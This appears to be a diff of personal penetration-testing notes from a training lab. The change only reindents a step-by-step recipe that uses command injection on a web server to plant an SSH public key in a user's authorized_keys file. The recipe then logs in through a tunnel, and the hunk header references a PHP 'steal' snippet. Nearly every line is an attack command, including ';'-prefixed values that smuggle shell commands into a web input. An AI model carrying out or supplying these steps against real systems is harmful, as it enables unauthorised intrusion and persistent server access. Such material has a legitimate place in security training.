@@ -203,11 +203,11 @@ fclose($steal);i
 ?>
 
 ### SSH KEYGEN/UPLOAD - works with command injection to view home directory of current user - home dir here is /var/user
-  -1. Make a directory to put my own key inside: ;mkdir /var/user/.ssh
-  -2. See if the dir was made: ls /var/user
-  -3. Run on own: ssh-keygen -t rsa -b 4096; hit enter 3 times after running it
-  -4. Run on own: cat /home/student/.ssh/id_rsa.pub - COPY EVERYTHING THAT IS OUTPUTTED top to bottom
-  -5. Run on web: ;echo "<output of number 4>" > /var/user/.ssh/authorized_keys
-  -6. Verify key was made: ;ls -lisa /var/user/.ssh
-  -7. Modify already made tunnel to hit the port 22 at end of -L
-  -8. Run on own to query tunnel: ssh -i .ssh/id_rsa.pub user@127.0.0.1 -p RHP
+-1. Make a directory to put my own key inside: ;mkdir /var/user/.ssh
+-2. See if the dir was made: ls /var/user
+-3. Run on own: ssh-keygen -t rsa -b 4096; hit enter 3 times after running it
+-4. Run on own: cat /home/student/.ssh/id_rsa.pub - COPY EVERYTHING THAT IS OUTPUTTED top to bottom
+-5. Run on web: ;echo "<output of number 4>" > /var/user/.ssh/authorized_keys
+-6. Verify key was made: ;ls -lisa /var/user/.ssh
+-7. Modify already made tunnel to hit the port 22 at end of -L
+-8. Run on own to query tunnel: ssh -i .ssh/id_rsa.pub user@127.0.0.1 -p RHP
